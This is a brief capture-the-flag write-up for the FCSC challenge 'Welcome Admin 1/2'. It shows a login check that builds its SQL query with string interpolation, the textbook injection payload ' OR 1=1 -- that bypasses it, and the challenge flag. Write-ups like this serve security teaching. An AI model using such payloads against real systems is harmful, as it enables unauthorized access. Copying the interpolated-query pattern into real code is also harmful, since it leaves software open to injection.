# Welcome Admin 1/2

## Challenge Overview
- **Points:** 20
- **Original French description:** Au coeur d'un réseau labyrinthique, là où la lumière des écrans peine à éclairer les recoins les plus sombres, une demande spéciale est lancée dans les abîmes, un appel discret, attendu seulement par ceux qui connaissent les profondeurs. Seul un véritable expert pourra répondre à l'appel, cryptiquement formulé : "Un expert en SQL est demandé à la caisse numéro 3."
- **Translated Description :** In the heart of a labyrinthine network, where the light from screens struggles to illuminate the darkest corners, a special request is launched into the abyss, a discreet call, awaited only by those who know the depths. Only a true expert will be able to answer the cryptically formulated call: 'An SQL expert is requested at checkout number 3.'

- **Link:** [https://welcome-admin.france-cybersecurity-challenge.fr/](https://welcome-admin.france-cybersecurity-challenge.fr/)

## Solution
- **Description:** Reading the application code we notice that we can make a simple SQL injection.
- **Attack Type:** SQL Injection
- **Payload:** 
' OR 1=1 --

```python
cursor.execute(f"SELECT '{token}' = '{password}'")
```
Becomes 

```python
cursor.execute(f"SELECT 'somegeneratedtoken' = '' OR 1=1 --'")
```
- **Flag:** 
FCSC{94738150696e2903c924f0079bd95cd8256c648314654f32d6aaa090846a8af5}
